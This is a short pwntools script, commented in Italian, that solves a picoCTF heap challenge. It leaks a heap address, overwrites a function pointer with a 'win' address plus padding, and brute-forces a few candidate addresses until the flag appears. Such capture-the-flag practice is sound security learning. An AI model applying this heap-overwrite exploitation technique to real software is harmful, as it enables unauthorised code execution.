from pwn import *

context.arch = 'amd64'

def solve(target_addr):
    try:
        # Apriamo una nuova connessione per ogni tentativo
        p = remote('mimas.picoctf.net', 57755)
        
        # 1. Leak Heap
        p.sendlineafter(b"choice: ", b"1")
        p.recvuntil(b"Address   ->   Value")
        p.recvuntil(b"+-------------+-----------+")
        p.recvuntil(b"[*]   ")
        addr_heap = int(p.recvuntil(b" ", drop=True), 16)
        
        # 2. Costruzione Payload
        # Usiamo solo i byte necessari (evitiamo i \x00 finali se possibile)
        win_bytes = p64(target_addr).rstrip(b'\x00')
        heap_bytes = p64(addr_heap).rstrip(b'\x00')
        
        # Payload: [Indirizzo Win] + [Padding] + [Indirizzo Heap]
        # Se scanf interrompe, win_bytes (3 byte) non ha nulli nel mezzo!
        payload = win_bytes + b"A" * (32 - len(win_bytes)) + heap_bytes
        
        log.info(f"Tentativo con target {hex(target_addr)}...")
        
        # 3. Write
        p.sendlineafter(b"choice: ", b"2")
        p.sendlineafter(b"buffer: ", payload)
        
        # 4. Trigger
        p.sendlineafter(b"choice: ", b"4")
        
        # 5. Cerca la flag
        # Aspettiamo un po' più di tempo (3 secondi)
        answer = p.recvuntil(b"}", timeout=3)
        if b"picoCTF" in answer:
            print("\n" + "!"*30)
            print(f"FLAG TROVATA: {answer.decode(errors='ignore')}")
            print("!"*30)
            return True
        
        p.close()
    except EOFError:
        return False
    return False

# Proviamo gli indirizzi critici per l'allineamento dello stack
targets = [0x4011a0, 0x4011a1, 0x4011a8, 0x4011a5]

for t in targets:
    if solve(t):
        break
